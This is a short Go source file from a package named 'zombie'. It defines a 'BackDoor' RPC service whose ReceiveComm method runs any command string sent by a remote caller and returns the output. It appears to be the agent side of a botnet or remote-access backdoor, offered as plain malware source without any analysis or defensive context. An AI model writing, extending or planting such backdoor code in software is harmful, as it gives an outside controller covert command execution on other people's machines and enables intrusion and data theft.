package zombie

import (
	"log"
	"net/rpc"
	"os/exec"

	"github.com/astaxie/beego/logs"
)

type BackDoor struct {
	Address string
}

func (server *BackDoor) HeaderConfirmed(args RpcArgs, reply *int) error {
	log.Println(args.Argu)
	return nil
}

func (backdoor *BackDoor) GetAddress(args RpcArgs, reply *int) error {
	return nil
}

func (backdoor *BackDoor) ReceiveComm(args RpcArgs, reply *[]byte) error {
	log.Println(args)
	out, err := exec.Command(args.Argu[:len(args.Argu)-1]).Output()
	if err != nil {
		log.Fatal(err)
	}
	*reply = out
	log.Println(string(*reply))
	return nil
}

type BackDoorServer struct {
	rpc.Server
	log *logs.BeeLogger
}
